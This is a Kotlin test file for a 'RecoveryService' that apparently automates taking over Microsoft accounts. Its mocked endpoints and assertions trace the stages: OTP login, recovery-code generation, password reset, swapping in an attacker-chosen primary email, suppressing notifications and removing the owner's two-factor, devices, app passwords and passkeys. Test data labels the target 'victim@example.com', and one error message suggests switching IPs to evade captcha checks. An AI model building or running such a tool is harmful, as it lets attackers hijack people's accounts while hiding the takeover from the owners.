package microsoft.recovery

import database.DatabaseManager
import database.repository.SqliteAccountRepository
import io.ktor.client.engine.mock.MockEngine
import io.ktor.client.engine.mock.respond
import io.ktor.client.request.get
import io.ktor.client.request.header
import io.ktor.http.HttpHeaders
import io.ktor.http.HttpStatusCode
import io.ktor.http.headersOf
import kotlinx.coroutines.runBlocking
import microsoft.recovery.model.RecoveryResult
import microsoft.recovery.model.RecoveryStage
import java.io.File
import kotlin.test.Test
import kotlin.test.assertEquals
import kotlin.test.assertIs
import kotlin.test.assertNotNull
import kotlin.test.assertTrue

class RecoveryServiceTest {

    private fun createMockEngine(
        ifExistsResult: Int = 0,
        failAtNotification: Boolean = false,
        otcState: Int = 201,
        otcFlowToken: String? = "MOCK_NEW_PPFT_456",
        returnAuthCookie: Boolean = true,
        includeTokenT: Boolean = true,
        returnPpftOnPolish: Boolean = false,
        redirectPolish: Boolean = false,
        onStage3Request: ((io.ktor.client.request.HttpRequestData) -> Unit)? = null,
        extraCookies: Boolean = false,
    ): MockEngine {
        var manageAdditionalCalls = 0

        return MockEngine { request ->
            val path = request.url.encodedPath
            when {
                path == "/login.srf" && request.url.parameters.contains("wreply") -> {
                    onStage3Request?.invoke(request)
                    if (redirectPolish) {
                        respond("", HttpStatusCode.Found, headersOf(HttpHeaders.Location, "/login_redirect.srf"))
                    } else if (returnPpftOnPolish) {
                        respond("<html><form><input type=\"hidden\" name=\"PPFT\" value=\"expired\"/></form></html>", HttpStatusCode.OK)
                    } else if (!includeTokenT) {
                        respond("<html><body>No token here</body></html>", HttpStatusCode.OK)
                    } else {
                        respond(
                            content = """
                                <html>
                                <form>
                                <input type="hidden" name="t" value="SAMPLE_TOKEN_T_VALUE_1024"/>
                                </form>
                                </html>
                            """.trimIndent(),
                            status = HttpStatusCode.OK,
                            headers = headersOf(HttpHeaders.ContentType, "text/html"),
                        )
                    }
                }

                path == "/login_redirect.srf" -> {
                    respond(
                        content = """
                            <html>
                            <form>
                            <input type="hidden" name="t" value="SAMPLE_TOKEN_T_VALUE_1024"/>
                            </form>
                            </html>
                        """.trimIndent(),
                        status = HttpStatusCode.OK,
                        headers = headersOf(HttpHeaders.ContentType, "text/html"),
                    )
                }

                path == "/login.srf" -> {
                    val headers = if (extraCookies) {
                        headersOf(
                            HttpHeaders.ContentType to listOf("text/html"),
                            HttpHeaders.SetCookie to listOf("uaid=server_uaid_9999; Domain=login.live.com; Path=/"),
                        )
                    } else {
                        headersOf(HttpHeaders.ContentType, "text/html")
                    }
                    respond(
                        content = """
                            <html>
                            <script>
                            var ServerData = {"sFTAg":"<input type=\"hidden\" name=\"PPFT\" id=\"i0327\" value=\"MOCK_PPFT_123\"/>","canary":""};
                            </script>
                            </html>
                        """.trimIndent(),
                        status = HttpStatusCode.OK,
                        headers = headers,
                    )
                }

                path == "/GetCredentialType.srf" -> {
                    val proofsJson = if (ifExistsResult == 0) {
                        """[{"data":"proof_data_xyz","display":"user@example.com","type":1}]"""
                    } else {
                        "[]"
                    }
                    val headers = if (extraCookies) {
                        headersOf(
                            HttpHeaders.ContentType to listOf("application/json"),
                            HttpHeaders.SetCookie to listOf("OParams=legacy_oparams_val; Domain=login.live.com; Path=/"),
                        )
                    } else {
                        headersOf(HttpHeaders.ContentType, "application/json")
                    }
                    respond(
                        content = """
                            {
                                "IfExistsResult": $ifExistsResult,
                                "Credentials": {
                                    "HasPassword": 1,
                                    "OtcLoginEligibleProofs": $proofsJson
                                }
                            }
                        """.trimIndent(),
                        status = HttpStatusCode.OK,
                        headers = headers,
                    )
                }

                path == "/GetOneTimeCode.srf" -> {
                    val flowTokenField = if (otcFlowToken != null) """, "FlowToken": "$otcFlowToken"""" else ""
                    val headers = if (extraCookies) {
                        headersOf(
                            HttpHeaders.ContentType to listOf("application/json"),
                            HttpHeaders.SetCookie to listOf("PPState=legacy_ppstate_val; Domain=login.live.com; Path=/"),
                        )
                    } else {
                        headersOf(HttpHeaders.ContentType, "application/json")
                    }
                    respond(
                        content = """{"State": $otcState$flowTokenField}""",
                        status = HttpStatusCode.OK,
                        headers = headers,
                    )
                }

                path == "/ppsecure/post.srf" -> {
                    val headers = if (returnAuthCookie) {
                        headersOf(
                            HttpHeaders.ContentType to listOf("text/html"),
                            HttpHeaders.SetCookie to listOf("__Host-MSAAUTH=msa_session_cookie_token; path=/; secure"),
                        )
                    } else {
                        headersOf(HttpHeaders.ContentType, "text/html")
                    }
                    respond(
                        content = "<html>Redirecting...</html>",
                        status = HttpStatusCode.Found,
                        headers = headers,
                    )
                }

                path == "/proofs/Add" -> {
                    respond(
                        content = "<html>Redirecting...</html>",
                        status = HttpStatusCode.Found,
                        headers = headersOf(
                            HttpHeaders.ContentType to listOf("text/html"),
                            HttpHeaders.SetCookie to listOf(
                                "AMRPSSecAuth=amrp_sec_cookie_val; path=/; domain=account.live.com",
                                "amsc=amsc_cookie_val; path=/; domain=account.live.com",
                            ),
                        ),
                    )
                }

                path == "/proofs/manage/additional" -> {
                    manageAdditionalCalls++
                    respond(
                        content = """
                            <html>
                            <script>
                            var t0 = {
                                "WLXAccount": {
                                    "manageProofs": {
                                        "encryptedNetId": "enc_net_id_\\u002b123\\u003d",
                                        "apiCanary": "canary_token_manage_1",
                                        "emailProofs": [{"name": "victim_email\\u0040example.com"}],
                                        "smsProofs": [{"name": "+1234567890"}],
                                        "passKeys": [{"passKeyId": "passkey-id-1"}]
                                    }
                                }
                            };
                            </script>
                            </html>
                        """.trimIndent(),
                        status = HttpStatusCode.OK,
                        headers = headersOf(HttpHeaders.ContentType, "text/html"),
                    )
                }

                path == "/API/Proofs/GenerateRecoveryCode" -> {
                    respond(
                        content = """
                            {
                                "recoveryCode": "INITIAL-RECOV-11111-22222-33333",
                                "apiCanary": "canary_token_after_gen"
                            }
                        """.trimIndent(),
                        status = HttpStatusCode.OK,
                        headers = headersOf(HttpHeaders.ContentType, "application/json"),
                    )
                }

                path == "/ResetPassword.aspx" -> {
                    respond(
                        content = """
                            <html>
                            <script>
                            var ServerData = {
                                "sRecoveryToken": "s_recovery_token_\\u002bdata_xyz",
                                "apiCanary": "canary_token_reset_page"
                            };
                            </script>
                            </html>
                        """.trimIndent(),
                        status = HttpStatusCode.OK,
                        headers = headersOf(HttpHeaders.ContentType, "text/html"),
                    )
                }

                path == "/API/Recovery/VerifyRecoveryCode" -> {
                    respond(
                        content = """
                            {
                                "token": "verification_grant_token_123",
                                "apiCanary": "canary_token_after_verify"
                            }
                        """.trimIndent(),
                        status = HttpStatusCode.OK,
                        headers = headersOf(HttpHeaders.ContentType, "application/json"),
                    )
                }

                path == "/API/Recovery/RecoverUser" -> {
                    respond(
                        content = """
                            {
                                "recoveryCode": "FINAL-RECOV-44444-55555-66666",
                                "apiCanary": "canary_token_after_recover"
                            }
                        """.trimIndent(),
                        status = HttpStatusCode.OK,
                        headers = headersOf(HttpHeaders.ContentType, "application/json"),
                    )
                }

                path == "/API/Proofs/SetUserNotificationState" -> {
                    if (failAtNotification) {
                        respond("Internal server error", HttpStatusCode.InternalServerError)
                    } else {
                        respond(
                            content = """{"apiCanary": "canary_token_after_notify"}""",
                            status = HttpStatusCode.OK,
                            headers = headersOf(HttpHeaders.ContentType, "application/json"),
                        )
                    }
                }

                path == "/AddAssocId" -> {
                    respond("<html>Alias added</html>", HttpStatusCode.OK)
                }

                path == "/API/MakePrimary" -> {
                    respond(
                        content = """{"apiCanary": "canary_token_after_makeprimary"}""",
                        status = HttpStatusCode.OK,
                        headers = headersOf(HttpHeaders.ContentType, "application/json"),
                    )
                }

                path == "/names/manage" -> {
                    respond("<html>Alias removed</html>", HttpStatusCode.OK)
                }

                path == "/API/Proofs/DisableTfa" ||
                path == "/API/Proofs/DeleteDevices" ||
                path == "/API/Proofs/DeleteAppPassword" ||
                path == "/API/Proofs/RemovePasskey" -> {
                    respond(
                        content = """{"apiCanary": "canary_token_after_cleanup"}""",
                        status = HttpStatusCode.OK,
                        headers = headersOf(HttpHeaders.ContentType, "application/json"),
                    )
                }

                else -> error("Unhandled request path: $path")
            }
        }
    }

    @Test
    fun testCompleteLifecycleSuccess(): Unit = runBlocking {
        val engine = createMockEngine()
        val tempDb = File.createTempFile("test_recov_", ".db")
        val dbManager = DatabaseManager(tempDb.absolutePath)
        val repository = SqliteAccountRepository(dbManager)

        val service = RecoveryService(
            clientEngine = engine,
            stageDelayMs = 0L,
            accountRepository = repository,
        )

        val result = service.runLifecycle(
            email = "victim@example.com",
            otpProvider = { "123456" },
            newEmail = "administrator2026@outlook.com",
        )

        if (result is RecoveryResult.Failure) {
            println("FAILURE STAGE: ${result.stage}, MESSAGE: ${result.message}")
        }
        assertIs<RecoveryResult.Success>(result)
        assertEquals("victim@example.com", result.originalEmail)
        assertEquals("administrator2026@outlook.com", result.newPrimaryEmail)
        assertEquals("INITIAL-RECOV-11111-22222-33333", result.initialRecoveryCode)
        assertEquals("FINAL-RECOV-44444-55555-66666", result.finalRecoveryCode)
        assertEquals(2, result.suppressedProofsCount)
        assertTrue(result.password.isNotEmpty())
        assertTrue(result.password.length in 12..16)

        val saved = repository.getAccountByEmail("victim@example.com")
        assertNotNull(saved)
        assertEquals(result.password, saved.password)
        assertEquals("FINAL-RECOV-44444-55555-66666", saved.recoveryCode)
        assertEquals("administrator2026@outlook.com", saved.currentPrimaryEmail)

        dbManager.close()
        tempDb.delete()
    }

    @Test
    fun testAccountNotFoundInDiscovery() = runBlocking {
        val engine = createMockEngine(ifExistsResult = 1)
        val service = RecoveryService(clientEngine = engine, stageDelayMs = 0L)

        val result = service.runLifecycle(
            email = "nonexistent@example.com",
            otpProvider = { "123456" },
            newPassword = "Pass",
            newEmail = "admin@outlook.com",
        )

        assertIs<RecoveryResult.Failure>(result)
        assertEquals(RecoveryStage.CREDENTIAL_DISCOVERY, result.stage)
        assertEquals("1", result.errorCode)
    }

    @Test
    fun testAccountThrottledInDiscovery() = runBlocking {
        val engine = createMockEngine(ifExistsResult = 5)
        val service = RecoveryService(clientEngine = engine, stageDelayMs = 0L)

        val result = service.runLifecycle(
            email = "throttled@example.com",
            otpProvider = { "123456" },
            newPassword = "Pass",
            newEmail = "admin@outlook.com",
        )

        assertIs<RecoveryResult.Failure>(result)
        assertEquals(RecoveryStage.CREDENTIAL_DISCOVERY, result.stage)
        assertEquals("5", result.errorCode)
    }

    @Test
    fun testMissingAuthCookieFailsSessionEstablishment() = runBlocking {
        val engine = createMockEngine(returnAuthCookie = false)
        val service = RecoveryService(clientEngine = engine, stageDelayMs = 0L)

        val result = service.runLifecycle(
            email = "victim@example.com",
            otpProvider = { "123456" },
            newPassword = "Pass",
            newEmail = "admin@outlook.com",
        )

        assertIs<RecoveryResult.Failure>(result)
        assertEquals(RecoveryStage.SESSION_ESTABLISHMENT, result.stage)
    }

    @Test
    fun testNotificationSuppressionFailClosed() = runBlocking {
        val engine = createMockEngine(failAtNotification = true)
        val service = RecoveryService(clientEngine = engine, stageDelayMs = 0L)

        val result = service.runLifecycle(
            email = "victim@example.com",
            otpProvider = { "123456" },
            newPassword = "Pass",
            newEmail = "admin@outlook.com",
        )

        assertIs<RecoveryResult.Failure>(result)
        assertEquals(RecoveryStage.NOTIFICATION_SUPPRESSION, result.stage)
    }

    @Test
    fun testStageListenerEmitsEvents() = runBlocking {
        val engine = createMockEngine()
        val service = RecoveryService(clientEngine = engine, stageDelayMs = 0L)
        val stagesLogged = mutableListOf<String>()

        val result = service.runLifecycle(
            email = "victim@example.com",
            otpProvider = { "123456" },
            newPassword = "Pass",
            newEmail = "admin@outlook.com",
            stageListener = { stageKey, _, isSuccess, _ ->
                stagesLogged.add("$stageKey:$isSuccess")
            },
        )

        if (result is RecoveryResult.Failure) {
            println("FAILURE STAGE: ${result.stage}, MESSAGE: ${result.message}")
        }
        assertIs<RecoveryResult.Success>(result)
        assertTrue(stagesLogged.contains("1:true"))
        assertTrue(stagesLogged.contains("2:true"))
        assertTrue(stagesLogged.contains("2b:true"))
        assertTrue(stagesLogged.contains("3:true"))
        assertTrue(stagesLogged.contains("4:true"))
        assertTrue(stagesLogged.contains("5:true"))
        assertTrue(stagesLogged.contains("6:true"))
        assertTrue(stagesLogged.contains("7:true"))
        assertTrue(stagesLogged.contains("8:true"))
        assertTrue(stagesLogged.contains("9:true"))
    }

    @Test
    fun testStage2State206ProceedsWithFlowToken(): Unit = runBlocking {
        val engine = createMockEngine(otcState = 206)
        val service = RecoveryService(clientEngine = engine, stageDelayMs = 0L)

        val result = service.runLifecycle(
            email = "victim@example.com",
            otpProvider = { "123456" },
            newPassword = "Pass",
            newEmail = "admin@outlook.com",
        )

        if (result is RecoveryResult.Failure) {
            println("FAILURE STAGE: ${result.stage}, MESSAGE: ${result.message}")
        }
        assertIs<RecoveryResult.Success>(result)
    }

    @Test
    fun testStage2MissingFlowTokenFails(): Unit = runBlocking {
        val engine = createMockEngine(otcState = 201, otcFlowToken = null)
        val service = RecoveryService(clientEngine = engine, stageDelayMs = 0L)

        val result = service.runLifecycle(
            email = "victim@example.com",
            otpProvider = { "123456" },
            newPassword = "Pass",
            newEmail = "admin@outlook.com",
        )

        assertIs<RecoveryResult.Failure>(result)
        assertEquals(RecoveryStage.OTP_DISPATCH, result.stage)
        assertEquals("Fatal: Missing FlowToken in response", result.message)
    }

    @Test
    fun testStage3SessionExpiredDetectsPpft(): Unit = runBlocking {
        val engine = createMockEngine(returnPpftOnPolish = true)
        val service = RecoveryService(clientEngine = engine, stageDelayMs = 0L)

        val result = service.runLifecycle(
            email = "victim@example.com",
            otpProvider = { "123456" },
            newPassword = "Pass",
            newEmail = "admin@outlook.com",
        )

        assertIs<RecoveryResult.Failure>(result)
        assertEquals(RecoveryStage.SESSION_POLISH, result.stage)
        assertEquals("Session expired or invalid, asked to login again.", result.message)
    }

    @Test
    fun testStage3MissingTokenT(): Unit = runBlocking {
        val engine = createMockEngine(includeTokenT = false)
        val service = RecoveryService(clientEngine = engine, stageDelayMs = 0L)

        val result = service.runLifecycle(
            email = "victim@example.com",
            otpProvider = { "123456" },
            newPassword = "Pass",
            newEmail = "admin@outlook.com",
        )

        assertIs<RecoveryResult.Failure>(result)
        assertEquals(RecoveryStage.SESSION_POLISH, result.stage)
        assertEquals("Token t not found in HTML.", result.message)
    }

    @Test
    fun testStage3RedirectFollowed(): Unit = runBlocking {
        val engine = createMockEngine(redirectPolish = true)
        val service = RecoveryService(clientEngine = engine, stageDelayMs = 0L)

        val result = service.runLifecycle(
            email = "victim@example.com",
            otpProvider = { "123456" },
            newPassword = "Pass",
            newEmail = "admin@outlook.com",
        )

        assertIs<RecoveryResult.Success>(result)
    }

    @Test
    fun testStage3CookieIsolation(): Unit = runBlocking {
        var capturedStage3Cookie: String? = null
        val engine = createMockEngine(
            extraCookies = true,
            onStage3Request = { req ->
                capturedStage3Cookie = req.headers[HttpHeaders.Cookie]
            },
        )
        val service = RecoveryService(clientEngine = engine, stageDelayMs = 0L)
        val result = service.runLifecycle(
            email = "victim@example.com",
            otpProvider = { "123456" },
            newPassword = "Pass",
            newEmail = "admin@outlook.com",
        )

        assertIs<RecoveryResult.Success>(result)
        assertNotNull(capturedStage3Cookie)
        assertTrue(capturedStage3Cookie!!.contains("__Host-MSAAUTH=msa_session_cookie_token"))
        assertTrue(capturedStage3Cookie!!.contains("uaid=server_uaid_9999"))
        assertTrue(!capturedStage3Cookie!!.contains("OParams"))
        assertTrue(!capturedStage3Cookie!!.contains("PPState"))
    }

    @Test
    fun testStage1NetworkExceptionGracefulFailure(): Unit = runBlocking {
        val engine = MockEngine { _ ->
            throw RuntimeException("Max send count 20 exceeded. Consider increasing the property maxSendCount if more is required.")
        }
        val service = RecoveryService(clientEngine = engine, stageDelayMs = 0L)
        val result = service.runLifecycle(
            email = "victim@example.com",
            otpProvider = { "123456" },
            newPassword = "Pass",
            newEmail = "admin@outlook.com",
        )

        assertIs<RecoveryResult.Failure>(result)
        assertEquals(RecoveryStage.CREDENTIAL_DISCOVERY, result.stage)
        assertEquals("Network timeout or Microsoft rate limit hit", result.message)
    }

    @Test
    fun testStage3InterstitialDetection(): Unit = runBlocking {
        val engine = MockEngine { request ->
            val path = request.url.encodedPath
            when {
                path == "/login.srf" && request.url.parameters.contains("wreply") -> {
                    respond(
                        content = "<html><head><title>Verify your identity</title></head><body><h1>Protect your account</h1><p>Please verify your identity.</p></body></html>",
                        status = HttpStatusCode.OK,
                        headers = headersOf(HttpHeaders.ContentType, "text/html"),
                    )
                }
                path == "/login.srf" -> {
                    respond(
                        content = "<html><script>var ServerData = {\"sFTAg\":\"<input type=\\\"hidden\\\" name=\\\"PPFT\\\" id=\\\"i0327\\\" value=\\\"MOCK_PPFT_123\\\"/>\",\"canary\":\"\"};</script></html>",
                        status = HttpStatusCode.OK,
                        headers = headersOf(HttpHeaders.ContentType, "text/html"),
                    )
                }
                path == "/GetCredentialType.srf" -> {
                    respond(
                        content = "{\"IfExistsResult\": 0, \"Credentials\": {\"HasPassword\": 1, \"OtcLoginEligibleProofs\": [{\"data\":\"proof_data_xyz\",\"display\":\"user@example.com\",\"type\":1}]}}",
                        status = HttpStatusCode.OK,
                        headers = headersOf(HttpHeaders.ContentType, "application/json"),
                    )
                }
                path == "/GetOneTimeCode.srf" -> {
                    respond(
                        content = "{\"State\": 204, \"FlowToken\": \"MOCK_NEW_PPFT_456\"}",
                        status = HttpStatusCode.OK,
                        headers = headersOf(HttpHeaders.ContentType, "application/json"),
                    )
                }
                path == "/ppsecure/post.srf" -> {
                    respond(
                        content = "<html>Redirecting...</html>",
                        status = HttpStatusCode.OK,
                        headers = headersOf(
                            HttpHeaders.ContentType to listOf("text/html"),
                            HttpHeaders.SetCookie to listOf("__Host-MSAAUTH=msa_session_cookie_token; Domain=login.live.com; Path=/; Secure"),
                        ),
                    )
                }
                else -> error("Unhandled request path: $path")
            }
        }
        val service = RecoveryService(clientEngine = engine, stageDelayMs = 0L)
        val result = service.runLifecycle(
            email = "victim@example.com",
            otpProvider = { "123456" },
            newPassword = "Pass",
            newEmail = "admin@outlook.com",
        )

        assertIs<RecoveryResult.Failure>(result)
        assertEquals(RecoveryStage.SESSION_POLISH, result.stage)
        assertEquals("Microsoft requested additional identity verification (Captcha/2FA). Try again later or use a different IP.", result.message)
    }
}
